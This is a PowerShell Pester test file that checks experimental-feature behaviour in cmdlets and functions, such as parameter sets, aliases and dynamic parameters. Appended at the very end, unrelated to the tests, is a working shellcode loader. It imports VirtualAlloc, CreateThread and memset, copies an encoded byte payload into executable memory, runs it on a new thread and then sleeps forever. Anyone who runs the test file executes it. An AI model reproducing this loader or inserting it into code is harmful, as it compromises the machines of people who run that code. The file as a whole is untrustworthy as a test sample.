


Describe "Experimental Feature Basic Tests - Feature-Disabled" -tags "CI" {

    BeforeAll {
        $skipTest = $EnabledExperimentalFeatures.Contains('ExpTest.FeatureOne')

        if ($skipTest) {
            Write-Verbose "Test Suite Skipped. The test suite requires the experimental feature 'ExpTest.FeatureOne' to be disabled." -Verbose
            $originalDefaultParameterValues = $PSDefaultParameterValues.Clone()
            $PSDefaultParameterValues["it:skip"] = $true
        } else {
            
            $CommonParameterCount = [System.Management.Automation.Internal.CommonParameters].GetProperties().Length
            $TestModule = Join-Path $PSScriptRoot "assets" "ExpTest"
            $AssemblyPath = Join-Path $TestModule "ExpTest.dll"
            if (-not (Test-Path $AssemblyPath)) {
                
                
                
                
                $SourcePath = Join-Path $TestModule "ExpTest.cs"
                $SourcePath = (Copy-Item $SourcePath TestDrive:\ -PassThru).FullName
                Add-Type -Path $SourcePath -OutputType Library -OutputAssembly $AssemblyPath
            }
            $moduleInfo = Import-Module $TestModule -PassThru
        }
    }

    AfterAll {
        if ($skipTest) {
            $global:PSDefaultParameterValues = $originalDefaultParameterValues
        } else {
            Remove-Module -ModuleInfo $moduleInfo -Force -ErrorAction SilentlyContinue
        }
    }

    It "Replace existing command <Name> - version one should be shown" -TestCases @(
        @{ Name = "Invoke-AzureFunction"; CommandType = "Function" }
        @{ Name = "Invoke-AzureFunctionCSharp"; CommandType = "Cmdlet" }
    ) {
        param($Name, $CommandType)
        $command = Get-Command $Name
        $command.CommandType | Should -Be $CommandType
        $command.Source | Should -BeExactly $moduleInfo.Name
        & $Name -Token "Token" -Command "Command" | Should -BeExactly "Invoke-AzureFunction Version ONE"

        if ($CommandType -eq "Function") {
            $expectedErrorId = "CommandNotFoundException,Microsoft.PowerShell.Commands.GetCommandCommand"
            { Get-Command "Invoke-AzureFunctionV2" -ErrorAction Stop } | Should -Throw -ErrorId $expectedErrorId
            { & $moduleInfo { Get-Command "Invoke-AzureFunctionV2" -ErrorAction Stop } } | Should -Throw -ErrorId $expectedErrorId
        }
    }

    It "Experimental parameter set - '<Name>' should NOT have '-SwitchOne' and '-SwitchTwo'" -TestCases @(
        @{ Name = "Get-GreetingMessage"; CommandType = "Function" }
        @{ Name = "Get-GreetingMessageCSharp"; CommandType = "Cmdlet" }
    ) {
        param($Name, $CommandType)
        $command = Get-Command $Name
        $command.CommandType | Should -Be $CommandType
        
        $command.Parameters.Count | Should -Be ($CommonParameterCount + 1)
        & $Name -Name Joe | Should -BeExactly "Hello World Joe."
    }

    It "Experimental parameter set - '<Name>' should NOT have 'WebSocket' parameter set" -TestCases @(
        @{ Name = "Invoke-MyCommand"; CommandType = "Function" }
        @{ Name = "Invoke-MyCommandCSharp"; CommandType = "Cmdlet" }
    ) {
        param($Name, $CommandType)
        $command = Get-Command $Name
        $command.CommandType | Should -Be $CommandType

        
        $command.Parameters.Count | Should -Be ($CommonParameterCount + 7)
        $command.ParameterSets.Count | Should -Be 2

        $command.Parameters["UserName"].ParameterSets.Count | Should -Be 1
        $command.Parameters["UserName"].ParameterSets.ContainsKey("ComputerSet") | Should -Be $true

        $command.Parameters["ComputerName"].ParameterSets.Count | Should -Be 1
        $command.Parameters["ComputerName"].ParameterSets.ContainsKey("ComputerSet") | Should -Be $true

        $command.Parameters["ConfigurationName"].ParameterSets.Count | Should -Be 1
        $command.Parameters["ConfigurationName"].ParameterSets.ContainsKey("ComputerSet") | Should -Be $true

        $command.Parameters["VMName"].ParameterSets.Count | Should -Be 1
        $command.Parameters["VMName"].ParameterSets.ContainsKey("VMSet") | Should -Be $true

        $command.Parameters["Port"].ParameterSets.Count | Should -Be 1
        $command.Parameters["Port"].ParameterSets.ContainsKey("VMSet") | Should -Be $true

        $command.Parameters["ThrottleLimit"].ParameterSets.Count | Should -Be 1
        $command.Parameters["ThrottleLimit"].ParameterSets.ContainsKey("__AllParameterSets") | Should -Be $true

        $command.Parameters["Command"].ParameterSets.Count | Should -Be 1
        $command.Parameters["Command"].ParameterSets.ContainsKey("__AllParameterSets") | Should -Be $true

        
        $command.ParameterSets[0].Name | Should -BeExactly "ComputerSet"
        $command.ParameterSets[0].Parameters.Count | Should -Be ($CommonParameterCount + 5)

        
        $command.ParameterSets[1].Name | Should -BeExactly "VMSet"
        $command.ParameterSets[1].Parameters.Count | Should -Be ($CommonParameterCount + 4)

        & $Name -UserName "user" -ComputerName "localhost" -ConfigurationName "config" | Should -BeExactly "Invoke-MyCommand with ComputerSet"
        & $Name -VMName "VM" -Port "80" | Should -BeExactly "Invoke-MyCommand with VMSet"
    }

    It "Experimental parameter set - '<Name>' should have '-SessionName' only" -TestCases @(
        @{ Name = "Test-MyRemoting"; CommandType = "Function" }
        @{ Name = "Test-MyRemotingCSharp"; CommandType = "Cmdlet" }
    ) {
        param($Name, $CommandType)
        $command = Get-Command $Name
        $command.CommandType | Should -Be $CommandType
        
        $command.Parameters.Count | Should -Be ($CommonParameterCount + 1)
        $command.Parameters["SessionName"].ParameterType.FullName | Should -BeExactly "System.String"
        $command.Parameters.ContainsKey("ComputerName") | Should -Be $false
    }

    It "Use 'Experimental' attribute directly on parameters - '<Name>'" -TestCases @(
        @{ Name = "Save-MyFile"; CommandType = "Function" }
        @{ Name = "Save-MyFileCSharp"; CommandType = "Cmdlet" }
    ) {
        param($Name, $CommandType)
        $command = Get-Command $Name
        $command.CommandType | Should -Be $CommandType
        
        $command.Parameters.Count | Should -Be ($CommonParameterCount + 4)
        $command.ParameterSets.Count | Should -Be 2

        $command.Parameters["ByUrl"].ParameterSets.Count | Should -Be 1
        $command.Parameters["ByUrl"].ParameterSets.ContainsKey("UrlSet") | Should -Be $true

        $command.Parameters["ByRadio"].ParameterSets.Count | Should -Be 1
        $command.Parameters["ByRadio"].ParameterSets.ContainsKey("RadioSet") | Should -Be $true

        $command.Parameters["Configuration"].ParameterSets.Count | Should -Be 2
        $command.Parameters["Configuration"].ParameterSets.ContainsKey("UrlSet") | Should -Be $true
        $command.Parameters["Configuration"].ParameterSets.ContainsKey("RadioSet") | Should -Be $true

        $command.Parameters["FileName"].ParameterSets.Count | Should -Be 1
        $command.Parameters["FileName"].ParameterSets.ContainsKey("__AllParameterSets") | Should -Be $true

        $command.Parameters.ContainsKey("Destination") | Should -Be $false
    }

    It "Dynamic parameters - <CommandType>-<Name>" -TestCases @(
        @{ Name = "Test-MyDynamicParamOne"; CommandType = "Function" }
        @{ Name = "Test-MyDynamicParamOneCSharp"; CommandType = "Cmdlet" }
        @{ Name = "Test-MyDynamicParamTwo"; CommandType = "Function" }
        @{ Name = "Test-MyDynamicParamTwoCSharp"; CommandType = "Cmdlet" }
    ) {
        param($Name, $CommandType)
        $command = Get-Command $Name
        $command.CommandType | Should -Be $CommandType
        
        $command.Parameters.Count | Should -Be ($CommonParameterCount + 1)
        $command.Parameters["Name"] | Should -Not -BeNullOrEmpty

        $command = Get-Command $Name -ArgumentList "Joe"
        
        $command.Parameters.Count | Should -Be ($CommonParameterCount + 2)
        $command.Parameters["ConfigName"].Attributes.Count | Should -Be 2
        $command.Parameters["ConfigName"].Attributes[0] | Should -BeOfType [parameter]
        $command.Parameters["ConfigName"].Attributes[1] | Should -BeOfType [ValidateNotNullOrEmpty]

        $command.Parameters.ContainsKey("ConfigFile") | Should -Be $false
    }
}

Describe "Experimental Feature Basic Tests - Feature-Enabled" -Tag "CI" {

    BeforeAll {
        $skipTest = -not $EnabledExperimentalFeatures.Contains('ExpTest.FeatureOne')

        if ($skipTest) {
            Write-Verbose "Test Suite Skipped. The test suite requires the experimental feature 'ExpTest.FeatureOne' to be enabled." -Verbose
            $originalDefaultParameterValues = $PSDefaultParameterValues.Clone()
            $PSDefaultParameterValues["it:skip"] = $true
        } else {
            
            $CommonParameterCount = [System.Management.Automation.Internal.CommonParameters].GetProperties().Length
            $TestModule = Join-Path $PSScriptRoot "assets" "ExpTest"
            $AssemblyPath = Join-Path $TestModule "ExpTest.dll"
            if (-not (Test-Path $AssemblyPath)) {
                $SourcePath = Join-Path $TestModule "ExpTest.cs"
                $SourcePath = (Copy-Item $SourcePath TestDrive:\ -PassThru).FullName
                Add-Type -Path $SourcePath -OutputType Library -OutputAssembly $AssemblyPath
            }
            $moduleInfo = Import-Module $TestModule -PassThru
        }
    }

    AfterAll {
        if ($skipTest) {
            $global:PSDefaultParameterValues = $originalDefaultParameterValues
        } else {
            Remove-Module -ModuleInfo $moduleInfo -Force -ErrorAction SilentlyContinue
        }
    }

    It "Experimental feature 'ExpTest.FeatureOne' should be enabled" {
        $EnabledExperimentalFeatures.Count | Should -Be 1
        $EnabledExperimentalFeatures -contains "ExpTest.FeatureOne" | Should -Be $true
    }

    It "Replace existing command <Name> - version two should be shown" -TestCases @(
        @{ Name = "Invoke-AzureFunction"; CommandType = "Alias" }
        @{ Name = "Invoke-AzureFunctionCSharp"; CommandType = "Cmdlet" }
    ) {
        param($Name, $CommandType)
        $command = Get-Command $Name
        $command.CommandType | Should -Be $CommandType
        $command.Source | Should -BeExactly $moduleInfo.Name
        & $Name -Token "Token" -Command "Command" | Should -BeExactly "Invoke-AzureFunction Version TWO"

        if ($CommandType -eq "Alias") {
            $command.Definition | Should -Be "Invoke-AzureFunctionV2"
            $expectedErrorId = "CommandNotFoundException,Microsoft.PowerShell.Commands.GetCommandCommand"
            { Get-Command "Invoke-AzureFunction" -CommandType Function -ErrorAction Stop } | Should -Throw -ErrorId $expectedErrorId
            { & $moduleInfo { Get-Command "Invoke-AzureFunction" -CommandType Function -ErrorAction Stop } } | Should -Throw -ErrorId $expectedErrorId
        }
    }

    It "Experimental parameter set - '<Name>' should have '-SwitchOne' and '-SwitchTwo'" -TestCases @(
        @{ Name = "Get-GreetingMessage"; CommandType = "Function" }
        @{ Name = "Get-GreetingMessageCSharp"; CommandType = "Cmdlet" }
    ) {
        param($Name, $CommandType)
        $command = Get-Command $Name
        $command.CommandType | Should -Be $CommandType
        
        $command.Parameters.Count | Should -Be ($CommonParameterCount + 3)
        $command.ParameterSets.Count | Should -Be 3

        & $Name -Name Joe | Should -BeExactly "Hello World Joe."
        & $Name -Name Joe -SwitchOne | Should -BeExactly "Hello World Joe.-SwitchOne is on."
        & $Name -Name Joe -SwitchTwo | Should -BeExactly "Hello World Joe.-SwitchTwo is on."
    }

    It "Experimental parameter set - '<Name>' should have 'WebSocket' parameter set" -TestCases @(
        @{ Name = "Invoke-MyCommand"; CommandType = "Function" }
        @{ Name = "Invoke-MyCommandCSharp"; CommandType = "Cmdlet" }
    ) {
        param($Name, $CommandType)
        $command = Get-Command $Name
        $command.CommandType | Should -Be $CommandType

        
        
        $command.Parameters.Count | Should -Be ($CommonParameterCount + 9)
        $command.ParameterSets.Count | Should -Be 3

        $command.Parameters["UserName"].ParameterSets.Count | Should -Be 1
        $command.Parameters["UserName"].ParameterSets.ContainsKey("ComputerSet") | Should -Be $true

        $command.Parameters["ComputerName"].ParameterSets.Count | Should -Be 1
        $command.Parameters["ComputerName"].ParameterSets.ContainsKey("ComputerSet") | Should -Be $true

        $command.Parameters["VMName"].ParameterSets.Count | Should -Be 1
        $command.Parameters["VMName"].ParameterSets.ContainsKey("VMSet") | Should -Be $true

        $command.Parameters["Token"].ParameterSets.Count | Should -Be 1
        $command.Parameters["Token"].ParameterSets.ContainsKey("WebSocketSet") | Should -Be $true

        $command.Parameters["WebSocketUrl"].ParameterSets.Count | Should -Be 1
        $command.Parameters["WebSocketUrl"].ParameterSets.ContainsKey("WebSocketSet") | Should -Be $true

        $command.Parameters["ConfigurationName"].ParameterSets.Count | Should -Be 2
        $command.Parameters["ConfigurationName"].ParameterSets.ContainsKey("ComputerSet") | Should -Be $true
        $command.Parameters["ConfigurationName"].ParameterSets.ContainsKey("WebSocketSet") | Should -Be $true

        $command.Parameters["Port"].ParameterSets.Count | Should -Be 2
        $command.Parameters["Port"].ParameterSets.ContainsKey("VMSet") | Should -Be $true
        $command.Parameters["Port"].ParameterSets.ContainsKey("WebSocketSet") | Should -Be $true

        $command.Parameters["ThrottleLimit"].ParameterSets.Count | Should -Be 1
        $command.Parameters["ThrottleLimit"].ParameterSets.ContainsKey("__AllParameterSets") | Should -Be $true

        $command.Parameters["Command"].ParameterSets.Count | Should -Be 1
        $command.Parameters["Command"].ParameterSets.ContainsKey("__AllParameterSets") | Should -Be $true

        
        $command.ParameterSets[0].Name | Should -BeExactly "ComputerSet"
        $command.ParameterSets[0].Parameters.Count | Should -Be ($CommonParameterCount + 5)

        
        $command.ParameterSets[1].Name | Should -BeExactly "VMSet"
        $command.ParameterSets[1].Parameters.Count | Should -Be ($CommonParameterCount + 4)

        
        $command.ParameterSets[2].Name | Should -BeExactly "WebSocketSet"
        $command.ParameterSets[2].Parameters.Count | Should -Be ($CommonParameterCount + 6)

        & $Name -UserName "user" -ComputerName "localhost" | Should -BeExactly "Invoke-MyCommand with ComputerSet"
        & $Name -UserName "user" -ComputerName "localhost" -ConfigurationName "config" | Should -BeExactly "Invoke-MyCommand with ComputerSet"

        & $Name -VMName "VM" | Should -BeExactly "Invoke-MyCommand with VMSet"
        & $Name -VMName "VM" -Port "80" | Should -BeExactly "Invoke-MyCommand with VMSet"

        & $Name -Token "token" -WebSocketUrl 'url' | Should -BeExactly "Invoke-MyCommand with WebSocketSet"
        & $Name -Token "token" -WebSocketUrl 'url' -ConfigurationName 'config' -Port 80 | Should -BeExactly "Invoke-MyCommand with WebSocketSet"
    }

    It "Experimental parameter set - '<Name>' should have '-ComputerName' only" -TestCases @(
        @{ Name = "Test-MyRemoting"; CommandType = "Function" }
        @{ Name = "Test-MyRemotingCSharp"; CommandType = "Cmdlet" }
    ) {
        param($Name, $CommandType)
        $command = Get-Command $Name
        $command.CommandType | Should -Be $CommandType
        
        $command.Parameters.Count | Should -Be ($CommonParameterCount + 1)
        $command.Parameters["ComputerName"].ParameterType.FullName | Should -BeExactly "System.String"
        $command.Parameters.ContainsKey("SessionName") | Should -Be $false
    }

    It "Use 'Experimental' attribute directly on parameters - '<Name>'" -TestCases @(
        @{ Name = "Save-MyFile"; CommandType = "Function" }
        @{ Name = "Save-MyFileCSharp"; CommandType = "Cmdlet" }
    ) {
        param($Name, $CommandType)
        $command = Get-Command $Name
        $command.CommandType | Should -Be $CommandType
        
        $command.Parameters.Count | Should -Be ($CommonParameterCount + 4)
        $command.ParameterSets.Count | Should -Be 2

        $command.Parameters["ByUrl"].ParameterSets.Count | Should -Be 1
        $command.Parameters["ByUrl"].ParameterSets.ContainsKey("UrlSet") | Should -Be $true

        $command.Parameters["ByRadio"].ParameterSets.Count | Should -Be 1
        $command.Parameters["ByRadio"].ParameterSets.ContainsKey("RadioSet") | Should -Be $true

        $command.Parameters["Destination"].ParameterSets.Count | Should -Be 1
        $command.Parameters["Destination"].ParameterSets.ContainsKey("__AllParameterSets") | Should -Be $true

        $command.Parameters["FileName"].ParameterSets.Count | Should -Be 1
        $command.Parameters["FileName"].ParameterSets.ContainsKey("__AllParameterSets") | Should -Be $true

        $command.Parameters.ContainsKey("Configuration") | Should -Be $false
    }

    It "Dynamic parameters - <CommandType>-<Name>" -TestCases @(
        @{ Name = "Test-MyDynamicParamOne"; CommandType = "Function" }
        @{ Name = "Test-MyDynamicParamOneCSharp"; CommandType = "Cmdlet" }
        @{ Name = "Test-MyDynamicParamTwo"; CommandType = "Function" }
        @{ Name = "Test-MyDynamicParamTwoCSharp"; CommandType = "Cmdlet" }
    ) {
        param($Name, $CommandType)

        $command = Get-Command $Name
        $command.CommandType | Should -Be $CommandType
        
        $command.Parameters.Count | Should -Be ($CommonParameterCount + 1)
        $command.Parameters["Name"] | Should -Not -BeNullOrEmpty

        $command = Get-Command $Name -ArgumentList "Joe"
        
        $command.Parameters.Count | Should -Be ($CommonParameterCount + 2)
        $command.Parameters["ConfigFile"].Attributes.Count | Should -Be 2
        $command.Parameters["ConfigFile"].Attributes[0] | Should -BeOfType [parameter]
        $command.Parameters["ConfigFile"].Attributes[1] | Should -BeOfType [ValidateNotNullOrEmpty]

        $command.Parameters.ContainsKey("ConfigName") | Should -Be $false
    }
}

Describe "Expected errors" -Tag "CI" {
    It "'[Experimental()]' should fail to construct the attribute" {
        { [Experimental()]param() } | Should -Throw -ErrorId "MethodCountCouldNotFindBest"
    }

    It "Argument validation for constructors of 'ExperimentalAttribute' - <TestName>" -TestCases @(
        @{ TestName = "Name is empty string"; FeatureName = "";                  FeatureAction = "None"; ErrorId = "PSArgumentNullException" }
        @{ TestName = "Name is null";         FeatureName = [NullString]::Value; FeatureAction = "None"; ErrorId = "PSArgumentNullException" }
        @{ TestName = "Action is None";       FeatureName = "feature";           FeatureAction = "None"; ErrorId = "PSArgumentException" }
        @{ TestName = "Action is Show";       FeatureName = "feature";           FeatureAction = "Show"; ErrorId = $null }
        @{ TestName = "Action is Hide";       FeatureName = "feature";           FeatureAction = "Hide"; ErrorId = $null }
    ) {
        param($FeatureName, $FeatureAction, $ErrorId)

        if ($ErrorId -ne $null) {
            { [Experimental]::new($FeatureName, $FeatureAction) } | Should -Throw -ErrorId $ErrorId
        } else {
            { [Experimental]::new($FeatureName, $FeatureAction) } | Should -Not -Throw
        }
    }

    It "Argument validation for constructors of 'ParameterAttribute' - <TestName>" -TestCases @(
        @{ TestName = "Name is empty string"; FeatureName = "";                  FeatureAction = "None"; ErrorId = "PSArgumentNullException" }
        @{ TestName = "Name is null";         FeatureName = [NullString]::Value; FeatureAction = "None"; ErrorId = "PSArgumentNullException" }
        @{ TestName = "Action is None";       FeatureName = "feature";           FeatureAction = "None"; ErrorId = "PSArgumentException" }
        @{ TestName = "Action is Show";       FeatureName = "feature";           FeatureAction = "Show"; ErrorId = $null }
        @{ TestName = "Action is Hide";       FeatureName = "feature";           FeatureAction = "Hide"; ErrorId = $null }
    ) {
        param($FeatureName, $FeatureAction, $ErrorId)

        if ($ErrorId -ne $null) {
            { [Parameter]::new($FeatureName, $FeatureAction) } | Should -Throw -ErrorId $ErrorId
        } else {
            { [Parameter]::new($FeatureName, $FeatureAction) } | Should -Not -Throw
        }
    }

    It "Feature name check" {
        $psd1Content = @'
@{
ModuleVersion = '0.0.1'
CompatiblePSEditions = @('Core')
GUID = 'ce31259c-1804-4016-bc29-083bd2599e19'
PrivateData = @{
    PSData = @{
        ExperimentalFeatures = @(
            @{ Name = '.Feature1'; Description = "Test feature number 1." }
            @{ Name = 'Feature2.'; Description = "Test feature number 2." }
            @{ Name = 'Feature3'; Description = "Test feature number 3." }
            @{ Name = 'Module.Feature4'; Description = "Test feature number 4." }
            @{ Name = 'InvalidFeatureName.Feature5'; Description = "Test feature number 5." }
        )
    }
}
}
'@
        $moduleFile = Join-Path $TestDrive InvalidFeatureName.psd1
        Set-Content -Path $moduleFile -Value $psd1Content -Encoding Ascii

        Import-Module $moduleFile -ErrorVariable featureNameError -ErrorAction SilentlyContinue
        $featureNameError | Should -Not -BeNullOrEmpty
        $featureNameError[0].FullyQualifiedErrorId | Should -Be "Modules_InvalidExperimentalFeatureName,Microsoft.PowerShell.Commands.ImportModuleCommand"
        $featureNameError[0].Exception.Message.Contains(".Feature1") | Should -Be $true
        $featureNameError[0].Exception.Message.Contains("Feature2.") | Should -Be $true
        $featureNameError[0].Exception.Message.Contains("Feature3") | Should -Be $true
        $featureNameError[0].Exception.Message.Contains("Module.Feature4") | Should -Be $true
        $featureNameError[0].Exception.Message.Contains("InvalidFeatureName.Feature5") | Should -Be $false
    }
}

$kXY = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $kXY -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xca,0xbd,0x7b,0xf3,0x34,0x4f,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x6a,0x18,0x83,0xea,0xfc,0x03,0x6a,0x6f,0x11,0xc1,0xb3,0x67,0x57,0x2a,0x4c,0x77,0x38,0xa2,0xa9,0x46,0x78,0xd0,0xba,0xf8,0x48,0x92,0xef,0xf4,0x23,0xf6,0x1b,0x8f,0x46,0xdf,0x2c,0x38,0xec,0x39,0x02,0xb9,0x5d,0x79,0x05,0x39,0x9c,0xae,0xe5,0x00,0x6f,0xa3,0xe4,0x45,0x92,0x4e,0xb4,0x1e,0xd8,0xfd,0x29,0x2b,0x94,0x3d,0xc1,0x67,0x38,0x46,0x36,0x3f,0x3b,0x67,0xe9,0x34,0x62,0xa7,0x0b,0x99,0x1e,0xee,0x13,0xfe,0x1b,0xb8,0xa8,0x34,0xd7,0x3b,0x79,0x05,0x18,0x97,0x44,0xaa,0xeb,0xe9,0x81,0x0c,0x14,0x9c,0xfb,0x6f,0xa9,0xa7,0x3f,0x12,0x75,0x2d,0xa4,0xb4,0xfe,0x95,0x00,0x45,0xd2,0x40,0xc2,0x49,0x9f,0x07,0x8c,0x4d,0x1e,0xcb,0xa6,0x69,0xab,0xea,0x68,0xf8,0xef,0xc8,0xac,0xa1,0xb4,0x71,0xf4,0x0f,0x1a,0x8d,0xe6,0xf0,0xc3,0x2b,0x6c,0x1c,0x17,0x46,0x2f,0x48,0xd4,0x6b,0xd0,0x88,0x72,0xfb,0xa3,0xba,0xdd,0x57,0x2c,0xf6,0x96,0x71,0xab,0xf9,0x8c,0xc6,0x23,0x04,0x2f,0x37,0x6d,0xc2,0x7b,0x67,0x05,0xe3,0x03,0xec,0xd5,0x0c,0xd6,0x99,0xd0,0x9a,0x19,0xf5,0xda,0x3e,0xf2,0x04,0xdd,0xaf,0xc0,0x80,0x3b,0x9f,0x94,0xc2,0x93,0x5f,0x45,0xa3,0x43,0x37,0x8f,0x2c,0xbb,0x27,0xb0,0xe6,0xd4,0xcd,0x5f,0x5f,0x8c,0x79,0xf9,0xfa,0x46,0x18,0x06,0xd1,0x22,0x1a,0x8c,0xd6,0xd3,0xd4,0x65,0x92,0xc7,0x80,0x85,0xe9,0xba,0x06,0x99,0xc7,0xd1,0xa6,0x0f,0xec,0x73,0xf1,0xa7,0xee,0xa2,0x35,0x68,0x10,0x81,0x4e,0xa1,0x84,0x6a,0x38,0xce,0x48,0x6b,0xb8,0x98,0x02,0x6b,0xd0,0x7c,0x77,0x38,0xc5,0x82,0xa2,0x2c,0x56,0x17,0x4d,0x05,0x0b,0xb0,0x25,0xab,0x72,0xf6,0xe9,0x54,0x51,0x06,0xd5,0x82,0x9f,0x7c,0x37,0x17;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$kIG=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($kIG.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$kIG,0,0,0);for (;;){Start-sleep 60};

